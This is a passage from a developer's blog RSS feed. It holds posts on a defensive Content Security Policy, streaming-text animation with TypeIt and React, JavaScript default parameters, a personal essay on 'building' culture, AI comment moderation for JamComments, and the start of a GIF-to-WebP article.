&lt;a href=&quot;https://www.npmjs.com/package/sanitize-html?ref=cms.macarthur.me&quot;&gt;sanitize-html&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;If you can get away with it, a good &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP?ref=cms.macarthur.me&quot;&gt;Content Security Policy&lt;/a&gt; is a wise idea too – just keep in mind it&apos;ll impact more than surgically sanitized HTML would. This one-liner in the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; of your page will block all inline handlers and &lt;code&gt;javascript://&lt;/code&gt; URLs on your page, even without sanitization. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
  &amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;&quot;&amp;gt;
&amp;lt;/head&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or set it as a response header. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;Content-Security-Policy: &quot;script-src &apos;self&apos;&quot;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Regardless, it&apos;s good to know the quirks of script execution in the browser. So, keep all this tucked away in case it&apos;s ever helpful.&lt;/p&gt;</content:encoded></item><item><title>Streaming Text Like an LLM with TypeIt (and React)</title><link>https://macarthur.me/posts/streaming-text-with-typeit</link><guid isPermaLink="true">https://macarthur.me/posts/streaming-text-with-typeit</guid><pubDate>Fri, 25 Oct 2024 01:07:57 GMT</pubDate><content:encoded>&lt;p&gt;Sam Selikoff shared &lt;a href=&quot;https://x.com/samselikoff/status/1849127495158714483?ref=cms.macarthur.me&quot;&gt;a slick demonstration&lt;/a&gt; of a React hook for animating text streamed from an LLM recently. It caught my eye for a couple reasons. First, it looks great. Second, one of my eternal pet projects is &lt;a href=&quot;https://www.typeitjs.com/?ref=cms.macarthur.me&quot;&gt;TypeIt&lt;/a&gt;, used to create very similar sorts of animations. &lt;/p&gt;&lt;p&gt;I couldn&apos;t help but create an example of my own using TypeIt, and it turned out to be pretty straightforward – so straightforward that I had time to write up this post exploring it some more.&lt;/p&gt;&lt;h2&gt;The Setup&lt;/h2&gt;&lt;p&gt;Everything you see here will remain in a React context (we&apos;ll use the &lt;a href=&quot;https://www.typeitjs.com/docs/react?ref=cms.macarthur.me&quot;&gt;typeit-react&lt;/a&gt; package), but it could be set up just as easily with another framework (or none at all). First, we&apos;re going to create a fake streaming API. Normally, this would be connected to real LLM. I&apos;m too cheap for that. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function chunkText(text, chunkSize = 3) {
  const chunks = [];

  for (let i = 0; i &amp;lt; text.length; i += chunkSize) {
    chunks.push(text.slice(i, i + chunkSize));
  }

  return chunks;
}

export async function streamText() {
  const text = &apos;Bunch of text...&apos;;
  const chunks = chunkText(text);

  async function* generateStream() {
    for (const chunk of chunks) {
      await new Promise((resolve) =&amp;gt; setTimeout(resolve, Math.random() * 50));

      yield chunk;
    }
  }

  return {
    textStream: generateStream()
  };
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next, let&apos;s scaffold a &lt;code&gt;useAnimatedText()&lt;/code&gt; hook to house all the typing business. It&apos;ll be very much inspired by the API Sam uses &lt;a href=&quot;https://buildui.com/recipes/use-animated-text?ref=cms.macarthur.me&quot;&gt;in his example&lt;/a&gt;. You could do whatever you like.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { useEffect, useState } from &apos;react&apos;;
import TypeIt from &apos;typeit-react&apos;;

export function useAnimatedText() {
  const [text, setText] = useState(&apos;&apos;);

  const el = (
    &amp;lt;TypeIt options={{ cursor: false }}&amp;gt;&amp;lt;/TypeIt&amp;gt;
  );

  return [el, setText];
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Notice this is returning two things – the JSX we&apos;ll want to render, as well as a function for updating the rendered text. We&apos;ll flesh this out more in a bit. &lt;/p&gt;&lt;p&gt;Finally, here&apos;s the shell of the app itself:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { streamText } from &apos;./streamText&apos;;
import { useAnimatedText } from &apos;./useAnimatedText&apos;;

export default function App() {
  const [animatedText, setText] = useAnimatedText();

  async function go() {
    const { textStream } = await streamText();

    for await (const textPart of textStream) {
      setText(textPart);
    }
  }

  return (
    &amp;lt;div&amp;gt;
      {animatedText}

      &amp;lt;button onClick={go} &amp;gt;
        Generate
      &amp;lt;/button&amp;gt;
    &amp;lt;/div&amp;gt;
  );
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The word-by-word animation animation style is the most similar to the one used by ChatGPT to generate chunks of text, so we&apos;ll start with that. First, we need to first make it possible to give text to the TypeIt instance whenever it&apos;s streamed. We&apos;ll use a bit of state to make it available as a variable:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { useEffect, useState } from &apos;react&apos;;
import TypeIt from &apos;typeit-react&apos;;

export function useAnimatedText() {
  const [instance, setInstance] = useState(null);
  const [text, setText] = useState(&apos;&apos;);

  const el = (
    &amp;lt;TypeIt options={{ cursor: false }}
      getAfterInit={(i) =&amp;gt; {
        setInstance(i);

        return i;
      }}
    &amp;gt;&amp;lt;/TypeIt&amp;gt;
  );

  return [el, setText];
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next up, we need to pass text to the instance whenever it&apos;s changed. Regrettably, that means reaching for &lt;code&gt;useEffect()&lt;/code&gt; (I&apos;m so sorry, &lt;a href=&quot;https://x.com/kentcdodds/status/1541722055489486849?ref=cms.macarthur.me&quot;&gt;@DavidKPiano&lt;/a&gt;):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { useEffect, useState } from &apos;react&apos;;
import TypeIt from &apos;typeit-react&apos;;

export function useAnimatedText() {
  const [instance, setInstance] = useState(null);
  const [text, setText] = useState(&apos;&apos;);

  useEffect(() =&amp;gt; {
    if (!instance) return;

    instance.type(text, { instant: true }).flush();
  }, [text]);

  const el = (
    &amp;lt;TypeIt options={{ cursor: false }}
      getAfterInit={(i) =&amp;gt; {
        setInstance(i);

        return i;
      }}
    &amp;gt;&amp;lt;/TypeIt&amp;gt;
  );

  return [el, setText];
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&apos;s break apart that &lt;code&gt;instance.type()&lt;/code&gt; line. First, the &lt;code&gt;.type()&lt;/code&gt; method will queue up any text you give it, and passing &lt;code&gt;{ instant: true }&lt;/code&gt; will cause it to be typed as one, single string (not character-by-character). Simple enough.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;.flush()&lt;/code&gt; method is &lt;a href=&quot;https://www.typeitjs.com/docs/vanilla/instance-methods/?ref=cms.macarthur.me#flush&quot;&gt;a little special&lt;/a&gt;. Normally, TypeIt holds a queue of items it needs to process (kicked off by &lt;code&gt;.go()&lt;/code&gt;), which then allows the animation to be replayed if needed. But we&apos;re typing content on-the-fly. Instead, using &lt;code&gt;.flush()&lt;/code&gt; will throw away your queue after the items are processed, making it great for a use case like this. Here&apos;s the final result: &lt;/p&gt;&lt;figure&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;/figure&gt;&lt;p&gt;If a letter-by-letter animation style is preferred, it&apos;s as simple as removing the &lt;code&gt;{ instant: true }&lt;/code&gt; and adjusting the speed as needed:&lt;/p&gt;&lt;figure&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;/figure&gt;&lt;h2&gt;Other Ideas? &lt;/h2&gt;&lt;p&gt;I&apos;m glad I tinkered with this a bit – it actually spawned an improvement to TypeIt&apos;s library itself. If you&apos;re interested in seeing how you might implement other typing-related animations with TypeIt, or if you have any suggestions to make it even better, &lt;a href=&quot;https://x.com/amacarthur?ref=cms.macarthur.me&quot;&gt;reach out on X&lt;/a&gt;!&lt;/p&gt;</content:encoded></item><item><title>I didn&apos;t know you could use sibling parameters as default values in functions.</title><link>https://macarthur.me/posts/sibling-parameters</link><guid isPermaLink="true">https://macarthur.me/posts/sibling-parameters</guid><pubDate>Sat, 12 Oct 2024 15:42:12 GMT</pubDate><content:encoded>&lt;p&gt;JavaScript has supported default parameter values since ES2015. You know this. I know this. What I &lt;em&gt;didn&apos;t&lt;/em&gt; know was that you can use previous &lt;em&gt;sibling&lt;/em&gt; &lt;em&gt;parameters&lt;/em&gt; as the default values themselves. (Or maybe &quot;adjacent positional parameters&quot;? Not sure what to call these.)&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function myFunc(arg1, arg2 = arg1) {
  console.log(arg1, arg2);
}

myFunc(&quot;arg1!&quot;);
// &quot;arg1!&quot; &quot;arg1!&quot;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Default_parameters?ref=cms.macarthur.me#earlier_parameters_are_available_to_later_default_parameters&quot;&gt;MDN even calls it out&lt;/a&gt; (I didn&apos;t find out until after publishing this post),  demonstrating how the feature could help with some unusual function signatures. &lt;/p&gt;&lt;p&gt;It works in class constructors too – something I found to be quite helpful in making some &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf.io&lt;/a&gt; code more testable. It&apos;s common to see simple dependency injection used to that end. Let&apos;s explore it a bit.&lt;/p&gt;&lt;h2&gt;A Scenario&lt;/h2&gt;&lt;p&gt;Keeping with the image optimization theme, say you have an &lt;code&gt;OptimizedImage&lt;/code&gt; class. Provide an image URL to its constructor, and you can retrieve either a freshly optimized buffer of the image or a cached version.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;class OptimizedImage {
  constructor(
    imageUrl: string,
    cacheService = new CacheService(),
    optimizeService = new OptimizeService()
  ) {
    this.imageUrl = imageUrl;
    this.cacheService = cacheService;
    this.optimizeService = optimizeService;
  }

  async get() {
    const cached = this.cacheService.get(this.imageUrl);

    // Return the previously optimized image.
    if (cached) return cached;

    const optimizedImage = await this.optimizeService
      .optimize(this.imageUrl);

    // Cache the optimized image for next time.
    return this.cacheService.put(this.imageUrl, optimizedImage);
  }
}

const instance = new OptimizedImage(&apos;https://macarthur.me/me.jpg&apos;);
const imgBuffer = await instance.get();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The only constructor parameter used in production is &lt;code&gt;imageUrl&lt;/code&gt;, but injecting &lt;code&gt;CacheService&lt;/code&gt; and &lt;code&gt;OptimizeService&lt;/code&gt; enables easier unit test with mocks:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { it, expect, vi } from &apos;vitest&apos;;
import { OptimizedImage } from &apos;./main&apos;;

it(&apos;returns freshly optimized image&apos;, async function () {
  const fakeImageBuffer = new ArrayBuffer(&apos;image!&apos;);
  const mockCacheService = {
    get: (url) =&amp;gt; null,
    put: vi.fn().mockResolvedValue(fakeImageBuffer),
  };

  const mockOptimizeService = {
    optimize: (url) =&amp;gt; fakeImageBuffer,
  };

  const optimizedImage = new OptimizedImage(
    &apos;https://test.jpg&apos;,
    mockCacheService,
    mockOptimizeService
  );

  const result = await optimizedImage.get();

  expect(result).toEqual(fakeImageBuffer);
  expect(mockCacheService.put).toHaveBeenCalledWith(
    &apos;https://test.jpg&apos;,
    &apos;optimized image&apos;
  );
});&lt;/code&gt;&lt;/pre&gt;&lt;h2&gt;Making It More Complicated&lt;/h2&gt;&lt;p&gt;In that example, both of those service classes use &lt;code&gt;imageUrl&lt;/code&gt; only when particular methods are invoked. But imagine if they required it to be passed into their own constructors instead. You might be tempted to pull instantiation into &lt;code&gt;OptimizedImage&lt;/code&gt;&apos;s constructor (I was): &lt;/p&gt;&lt;pre&gt;&lt;code&gt;class OptimizedImage {
  constructor(
    imageUrl: string
  ) {
    this.imageUrl = imageUrl;
    this.cacheService = new CacheService(imageUrl);
    this.optimizeService = new OptimizeService(imageUrl);
  }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That’d work, but now &lt;code&gt;OptimizedImage&lt;/code&gt; is fully responsible for service instantiation, and testing becomes more of a hassle too. It&apos;s not so easy to pass in mocks for service instances. &lt;/p&gt;&lt;p&gt;You could get around this by passing in mock class definitions, but you&apos;d then need create mock versions of those classes with their own constructors, making testing more tedious. Fortunately, there&apos;s another option: use the &lt;code&gt;imageUrl&lt;/code&gt; parameter in the rest of your argument list. &lt;/p&gt;&lt;h2&gt;Sharing Sibling Parameters&lt;/h2&gt;&lt;p&gt;I wasn&apos;t aware this was even possible until a little while ago. Here&apos;s how it&apos;d look:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;export class OptimizedImage {
  constructor(
    imageUrl: string,
    // Use the same `imageUrl` in both dependencies.
    cacheService = new CacheService(imageUrl),
    optimizeService = new OptimizeService(imageUrl)
  ) {
    this.cacheService = cacheService;
    this.optimizeService = optimizeService;
  }

  async get() {
    const cached = this.cacheService.get();

    // Return the previously optimized image.
    if (cached) return cached;

    const optimizedImage = await this.optimizeService.optimize();

    // Cache the optimized image for next time.
    return this.cacheService.put(optimizedImage);
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this setup, you&apos;re able to mock those instances just as easily as before, and the rest of the class doesn&apos;t even need to hold onto an instance of &lt;code&gt;imageUrl&lt;/code&gt; itself. Instantiation, of course, still remains simple: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const instance = new OptimizedImage(&apos;https://macarthur.me/me.jpg&apos;);

const img = await instance.get();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The same testing approach remains in tact as well:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { it, expect, vi } from &apos;vitest&apos;;
import { OptimizedImage } from &apos;./main&apos;;

it(&apos;returns freshly optimized image&apos;, async function () {
  const mockCacheService = {
    get: () =&amp;gt; null,
    put: vi.fn().mockResolvedValue(&apos;optimized image&apos;),
  };

  const mockOptimizeService = {
    optimize: () =&amp;gt; &apos;optimized image&apos;,
  };

  const optimizedImage = new OptimizedImage(
    &apos;https://test.jpg&apos;,
    mockCacheService,
    mockOptimizeService
  );

  const result = await optimizedImage.get();

  expect(result).toEqual(&apos;optimized image&apos;);
  expect(mockCacheService.put).toHaveBeenCalledWith(&apos;optimized image&apos;);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing revolutionary here – just a feature that makes a particular problem a little more ergonomic to solve. &lt;/p&gt;&lt;h2&gt;Other Use Cases?&lt;/h2&gt;&lt;p&gt;Beyond something like this, I haven&apos;t come across a use case when this feature is especially handy. But there may be some opportunity to harden your job security and establish your undefeated cleverness. Here&apos;s a fun one &lt;a href=&quot;https://www.reddit.com/user/oculus42/?ref=cms.macarthur.me&quot;&gt;oculus42&lt;/a&gt; &lt;a href=&quot;https://www.reddit.com/r/javascript/comments/1g22zkk/comment/lrmb7gc/?ref=cms.macarthur.me&quot;&gt;dropped on Reddit&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;Consider calculating the sum of an array of numbers with &lt;code&gt;.reduce()&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const numbers = [1, 2, 3, 4, 5];

const total = numbers.reduce((acc, value) =&amp;gt; {
  return acc + value;
});

console.log(total); // 15&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &quot;business&quot; for this process lives in the function body. But you could shove it into function signature as a default parameter too, leaving the body to only return the result.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const total = numbers.reduce(
  (acc, value, _index, _array, result = acc + value) =&amp;gt; {
    return result;
  }
);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And it can use an implicit &lt;code&gt;return&lt;/code&gt; to look even more impressive: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const total = numbers.reduce((acc, value, _index, _array, result = acc + value) =&amp;gt; result);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pretty weird. Not tremendously useful from my own experience, but interesting nonetheless. Eager to come across more gems like this in the future.&lt;/p&gt;</content:encoded></item><item><title>Empty Building</title><link>https://macarthur.me/posts/build</link><guid isPermaLink="true">https://macarthur.me/posts/build</guid><pubDate>Wed, 02 Oct 2024 16:46:03 GMT</pubDate><content:encoded>&lt;p&gt;I’ve started to notice my stomach bunch up when I come across #BuildInPublic hashtags, or see people throw around phrases like:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;“Forget everything else. Just get out there and build.”&lt;/li&gt;&lt;li&gt;“It’s all about building cool stuff together.”&lt;/li&gt;&lt;li&gt;“The future belongs to the builders.”&lt;/li&gt;&lt;li&gt;“Stop talking. Start building.”&lt;/li&gt;&lt;li&gt;“So much to build, so little time.”&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;At first, I wasn’t totally sure why I grimace at this stuff. I like building things. I get paid to build things. That’s a fortunate combination I do not take for granted.&lt;/p&gt;&lt;p&gt;It think it’s because the whole endeavor comes off as very empty if it’s just about &lt;em&gt;building for the sake of building&lt;/em&gt;. I’m made to feel like a machine whose value is to produce, and who’s cursed to fall behind if I don’t — a fear especially pervasive in a technical field. &lt;/p&gt;&lt;p&gt;A lot of this probably stems from falling prey to lies like that earlier in my career. There’s a lot of dopamine to be squeezed out of building software. I vividly remember the feeling of customizing the CSS of my Blogger theme, the first time I used hooks in WordPress, and making a box slide open with jQuery. I felt like I had tapped into a power few others have, and it felt good to wield it. &lt;/p&gt;&lt;p&gt;So, I built a lot of stuff — 137 versions of my blog, WordPress plugins, little JavaScript libraries, and other digital widgets. It was satisfying. Some of the things I built were useful, but others were just for show. Regardless, that wasn&apos;t what kept me going. It was more primal than anything else. I was pulled by the promise of another dopamine hit, and pushed by the fear of becoming irrelevant if I didn’t keep it up. It was exhausting. It felt like I was running on some nihilistic hamster wheel. None of it mattered, but I couldn’t seem to stop.&lt;/p&gt;&lt;p&gt;Your soul catches onto that garbage after a while. You start to bend under the pressure of constantly thinking about the next thing you need build to maintain your influence; to earn your keep in the industry. You start to realize that every minute spent &quot;building cool stuff&quot; was one less spent on anything else important, and the exchange rates are &lt;em&gt;very&lt;/em&gt; different. A week in the evenings spent building will never yield the same impact as lying a few minutes longer next to your daughter before she goes to sleep, being present with your wife, or slowing down to sit with Scripture.&lt;/p&gt;&lt;p&gt;It’s sucks to come to that realization too late, although I do wonder if it ever would’ve happened if I hadn’t been ensnared by those lies to begin with. It’s too bad that life’s biggest perspective shifts often only come by the consequences of misplaced obsessions. I suppose there’s a gift in that. &lt;/p&gt;&lt;p&gt;I still love building things, and I don’t feel guilty for enjoying the dopamine hit when something’s finally shipped. But I like to think I’m getting better at demanding clarity of purpose before committing to anything, and understanding the tradeoffs  before diving in &amp;amp; slinging internet tubes around. My time and affection have to yield something other than brain chemicals and affirmation that I’m “one of the builders,” which doesn’t even mean anything to me anymore.&lt;/p&gt;&lt;p&gt;I consider this very much a “me” problem, by the way. Not everyone is so prone to becoming enslaved by their ability to make stuff. They’re somehow able to order their affections more effectively. I envy them for that. With some time &amp;amp; practice, I hope I’m able to reignite a passion to build stuff that doesn’t come at the expense of more lasting things worth building.&lt;/p&gt;</content:encoded></item><item><title>JamComments Now Offers AI-Powered Moderation</title><link>https://macarthur.me/posts/ai-moderation</link><guid isPermaLink="true">https://macarthur.me/posts/ai-moderation</guid><pubDate>Sun, 25 Aug 2024 03:30:36 GMT</pubDate><content:encoded>&lt;p&gt;While AI has absolutely flooded the digital product space for the past ~year, I&apos;ve been relatively hesitant about its role within digital products. LLMs in particular are incredibly useful (I use them almost every day), but there&apos;ve been a lot of relatively uninspiring product applications and so much hype. Frankly, many of the product using AI as their flagship feature solve a pain I have to be convinced I&apos;m suffering from. They&apos;re cool, but a hard sell. &lt;/p&gt;&lt;p&gt;For that reason, I&apos;ve been resistant to using it within my own products. I didn&apos;t want to bolt on an AI-powered feature for the sake of flashy marketability. If was going to use it, it&apos;d better be legitimately helpful.&lt;/p&gt;&lt;p&gt;Well, I think I&apos;ve actually found one (technically, credit goes to &lt;a href=&quot;https://cameronpak.com/?ref=cms.macarthur.me&quot;&gt;Cameron Pak&lt;/a&gt; for suggesting it).&lt;/p&gt;&lt;h2&gt;Moderation is Hard&lt;/h2&gt;&lt;p&gt;Anytime you&apos;re moderating user-generated content, you&apos;re in for some level of hassle. That&apos;s just part of the package when you need to balancing the free promotion of ideas with the appropriateness of the resulting content in a given context. If you err on the side of thorough moderation, you need to exert a lot of energy to do it well, and you risk stifling expression. Other other hand, taking a more laissez-faire approach carries a whole set of different risks. &lt;/p&gt;&lt;p&gt;In my experience with them, LLMs are pretty good at discerning linguistic expressions according to a set of principles you define. And especially with some guardrails in place, I really do think it can be a reliable moderator for this sort of purpose. &lt;/p&gt;&lt;p&gt;That&apos;s why I&apos;ve rolled out &lt;a href=&quot;https://jamcomments.com/docs/ai-moderation/?ref=cms.macarthur.me&quot;&gt;AI-powered moderation for JamComments&lt;/a&gt;. You define the principles it to be used when moderating a comment, and the machine will handle it from there. You no longer need to choose between auto-approving every new comment, or manually moderating each one yourself. &lt;/p&gt;&lt;h2&gt;Using AI Moderation &lt;/h2&gt;&lt;p&gt;There really isn&apos;t anything revolutionary going on here. After signing up for a paid account, all you need to do is enable AI-moderation on your site&apos;s settings page:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://jamcomments.com/img/auto-approval-settings.png&quot; alt=&quot;auto-approval settings&quot; loading=&quot;lazy&quot; width=&quot;1582&quot; height=&quot;916&quot; /&gt;&lt;/figure&gt;&lt;p&gt;After that, define a prompt the LLM will use to assess a comment. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://jamcomments.com/img/prompt.png&quot; alt=&quot;setting a prompt&quot; loading=&quot;lazy&quot; width=&quot;1236&quot; height=&quot;470&quot; /&gt;&lt;/figure&gt;&lt;p&gt;AI-powered &lt;em&gt;anything&lt;/em&gt; won&apos;t ever be deterministic, so you&apos;re welcome to test it on a few comments yourself before sticking with it: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://jamcomments.com/img/prompt-test.png&quot; alt=&quot;testing a prompt&quot; loading=&quot;lazy&quot; width=&quot;1010&quot; height=&quot;806&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The feature is powered by Anthropic&apos;s &lt;a href=&quot;https://www.anthropic.com/api?ref=cms.macarthur.me&quot;&gt;Claude&lt;/a&gt;, and is integrated with a healthy number of boundaries to prevent any sort of abuse or injection attacks. &lt;/p&gt;&lt;h2&gt;Possible Use Cases&lt;/h2&gt;&lt;p&gt;Ever since Camron first suggested the idea, my brain started stewing on the potential applications for different types of content. Here are some: &lt;/p&gt;&lt;p&gt;For your blog, you might want to avoid approving comments that contain any foul language. Possible prompt:&lt;/p&gt;&lt;blockquote&gt;&lt;em&gt;Do not approve any comments that contain foul language or cursing according to the language used by the typical English-speaking American. Some expressions are OK (like &quot;heck&quot; or &quot;darn it&quot;), but nothing beyond that level of intensity.&lt;/em&gt;&lt;/blockquote&gt;&lt;p&gt;Or maybe you run a faith-based digital magazine that allows reader-submitted comments and you want to make sure no inappropriate content is submitted:&lt;/p&gt;&lt;blockquote&gt;You&apos;re moderating comments made on articles for an online, faith-based magazine. Only approve comments that are neutral or uplifting in their spirit, and that do not disparage a person or group of people. Do not allow anything that encourages people to live against basic Christian principles.&lt;/blockquote&gt;&lt;p&gt;For one more example, perhaps you run an e-commerce store and you&apos;d like to keep reviews civil. &lt;/p&gt;&lt;blockquote&gt;The comment you are moderating is a product review. Do not allow the review if the person says they did not purchase the product. Do not allow cussing. Please DO approve comments that offer serious criticism in a mature way.&lt;/blockquote&gt;&lt;p&gt;You get the idea. &lt;/p&gt;&lt;h2&gt;Give It a Shot&lt;/h2&gt;&lt;p&gt;I realize that JamComments is in a rather interesting position because it&apos;s centered around written content – right up the alley of LLMs. So, I&apos;m eager to see how this feature is leveraged, as well as if other opportunities arise for using it further.   So, please — give it a shot and send me your feedback!&lt;/p&gt;</content:encoded></item><item><title>It Might Be Worth Converting that GIF to an Animated WebP</title><link>https://macarthur.me/posts/gif-to-webp</link><guid isPermaLink="true">https://macarthur.me/posts/gif-to-webp</guid><pubDate>Thu, 22 Aug 2024 23:26:24 GMT</pubDate><content:encoded>&lt;p&gt;Find one of your favorite GIFs on &lt;a href=&quot;https://giphy.com/?ref=cms.macarthur.me&quot;&gt;Giphy&lt;/a&gt; and download it. You might be surprised that the result saved to your device &lt;em&gt;won&apos;t be a GIF&lt;/em&gt;. It&apos;ll be an animated WebP. &lt;/p&gt;&lt;p&gt;It’s a very intentional move by Giphy, citing the &lt;a href=&quot;https://developers.giphy.com/docs/optional-settings/?ref=cms.macarthur.me#rendition-guide&quot;&gt;maximization of quality and reduction in load times&lt;/a&gt;. After all, we&apos;re in a time when page performance has prominent focus in the industry, especially after Google unveiled its Core Web Vitals as &lt;a href=&quot;https://developers.google.com/search/docs/appearance/core-web-vitals?ref=cms.macarthur.me&quot;&gt;a ranking factor&lt;/a&gt;. Coupled with the fact that WebP has &lt;a href=&quot;https://caniuse.com/webp?ref=cms.macarthur.me&quot;&gt;extremely good browser support&lt;/a&gt;, the move shouldn&apos;t be all that surprising. &lt;/p&gt;&lt;p&gt;Still, moving away from the GIF hits different. The format&apos;s become such a big part of meme culture, and has been responsible for ripping apart friendships over the correct pronunciation. It&apos;s hard to imagine a world in which GIFs... aren&apos;t actually GIFs.&lt;/p&gt;&lt;p&gt;But in context of the web, &lt;strong&gt;it makes a lot of sense to fully embrace WebP as an alternative, &lt;/strong&gt;even with the complicated feelings that linger around it.&lt;/p&gt;&lt;h2&gt;A Brief History of the GIF&lt;/h2&gt;&lt;p&gt;Believe it or not, the motivation behind the invention of the GIF had nothing to do with looping animations. It was all about performance. Back in 1987 (before the web was even a thing), &lt;a href=&quot;https://www.smithsonianmag.com/history/brief-history-gif-early-internet-innovation-ubiquitous-relic-180963543/?ref=cms.macarthur.me&quot;&gt;CompuServe&apos;s Steve Wilhite &amp;amp; team&lt;/a&gt; needed a way to save, share, and render images without hogging a computer&apos;s RAM or storage. &lt;/p&gt;&lt;p&gt;The Graphics Interchange Format (GIF) was the result. It sported a relatively efficient &lt;a href=&quot;https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch?ref=cms.macarthur.me&quot;&gt;compression algorithm&lt;/a&gt;, it could access 256 distinct colors per frame, and it could even contain &lt;a href=&quot;https://www.discovermagazine.com/technology/what-is-the-history-of-the-gif?ref=cms.macarthur.me&quot;&gt;multiple frames&lt;/a&gt; in a single file. &lt;/p&gt;&lt;p&gt;This was all big deal at the time, but the &lt;em&gt;animated&lt;/em&gt; GIFs we&apos;re more familiar with didn&apos;t hit the scene until 1995, when &lt;a href=&quot;https://www.acmi.net.au/works/61354--netscape-navigator-2-gif/?ref=cms.macarthur.me&quot;&gt;Netscape Navigator 2.0 was released&lt;/a&gt;. It was the first browser that supported looping GIF animations, leading to some interesting, now-vintage web art. If you&apos;d like to relive some of them yourself, check out &lt;a href=&quot;https://gifcities.org/?ref=cms.macarthur.me&quot;&gt;GifCities&lt;/a&gt;. You&apos;ll find some gems:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/08/America-Tribute.gif&quot; alt=&quot;weird GIF&quot; loading=&quot;lazy&quot; width=&quot;350&quot; height=&quot;350&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Since then, the GIF has been through a lot, including some fierce licensing fights that nearly ended its role on the internet &lt;a href=&quot;https://archive.junkee.com/curious-story-day-told-burn-gifs/192678?ref=cms.macarthur.me&quot;&gt;in the late 90s&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;But soon enough, it intersected with a growth of meme culture and the explosion of digital connectedness. It quickly emerged as &lt;a href=&quot;https://medium.com/ipg-media-lab/the-enduring-popularity-of-gifs-in-digital-culture-54763d7754aa?ref=cms.macarthur.me&quot;&gt;the preferred format&lt;/a&gt; for sending bite-sized, animated media between people. And that set up GIF platforms like &lt;a href=&quot;https://tenor.com/?ref=cms.macarthur.me&quot;&gt;Tenor&lt;/a&gt; and Giphy to thrive.&lt;/p&gt;&lt;h2&gt;Times (and Tech) Have Changed &lt;/h2&gt;&lt;p&gt;The technical implications of the GIF were significant at the time, but today, the landscape is different, and there’s a really good alternative available: WebP. Among the benefits: &lt;/p&gt;&lt;h3&gt;Significantly broader color depth.  &lt;/h3&gt;&lt;p&gt;The GIF supports a maximum of 256 colors. WebP, however, touts a depth of 24 bits, which amounts to &lt;em&gt;16.7 million colors&lt;/em&gt;, meaning you&apos;re able to produce far more vibrant; detailed images than before.&lt;/p&gt;&lt;h3&gt;More efficient (and flexible) compression. &lt;/h3&gt;&lt;p&gt;Lempel–Ziv–Welch, the compression algorithm behind the GIF, is an old, straighftforward, and reliable one. But it&apos;s not the most efficient, it isn&apos;t suited for &lt;a href=&quot;https://www.techtarget.com/whatis/definition/LZW-compression?ref=cms.macarthur.me#:~:text=One%20drawback%20of%20LZW%20compression%20is%20that%20compressed,fees%20may%20get%20added%20to%20the%20product%20cost.&quot;&gt;datasets with repetitive data&lt;/a&gt;, and it sometimes gets hairy due to &lt;a href=&quot;https://www.loc.gov/preservation/digital/formats/fdd/fdd000135.shtml?ref=cms.macarthur.me&quot;&gt;licensing &lt;/a&gt;restrictions. &lt;/p&gt;&lt;p&gt;WebP, on the other hand, was born out of the &lt;a href=&quot;https://en.wikipedia.org/wiki/VP8?ref=cms.macarthur.me&quot;&gt;VP8 video format&lt;/a&gt; and uses a more modern compression approach. Both lossy &amp;amp; lossless compression is supported, making it more flexible than its legacy counterpart as well, depending on your needs. To put it plainly, WebP was built for image animations.&lt;/p&gt;&lt;h3&gt;Smaller file size. &lt;/h3&gt;&lt;p&gt;Aside from all of that, another big advantage over GIF is the file size reduction for most images. On average, lossy &lt;a href=&quot;https://developers.google.com/speed/webp/faq?ref=cms.macarthur.me&quot;&gt;WebP animations are 64% smaller&lt;/a&gt;, while lossless versions are 19% smaller. Given the amount of imagery on the web, 